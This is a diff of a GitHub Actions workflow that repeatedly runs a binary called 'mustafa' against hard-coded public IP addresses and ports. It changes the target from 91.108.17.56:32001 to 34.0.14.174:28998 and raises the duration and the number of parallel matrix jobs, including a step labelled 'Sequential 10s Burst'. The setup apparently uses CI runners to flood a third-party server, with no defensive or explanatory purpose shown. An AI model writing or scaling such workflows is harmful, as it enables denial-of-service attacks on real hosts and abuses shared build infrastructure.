@@ -11,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x mustafa
-      - run: ./mustafa 91.108.17.56 32001 10 100
+      - run: ./mustafa 34.0.14.174 28998 10 100
 
   stage-1:
     needs: stage-0
@@ -22,7 +22,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x mustafa
-      - run: ./mustafa 91.108.17.56 32001 60 100
+      - run: ./mustafa 34.0.14.174 28998 100 100
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -32,7 +32,7 @@ jobs:
       - id: calc
         run: |
           
-          NUM_JOBS=$((60 / 10))
+          NUM_JOBS=$((100 / 10))
           
           ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
           echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
@@ -49,4 +49,4 @@ jobs:
       - name: Sequential 10s Burst
         run: |
           chmod +x mustafa
-          ./mustafa 91.108.17.56 32001 10 100
+          ./mustafa 34.0.14.174 28998 10 100
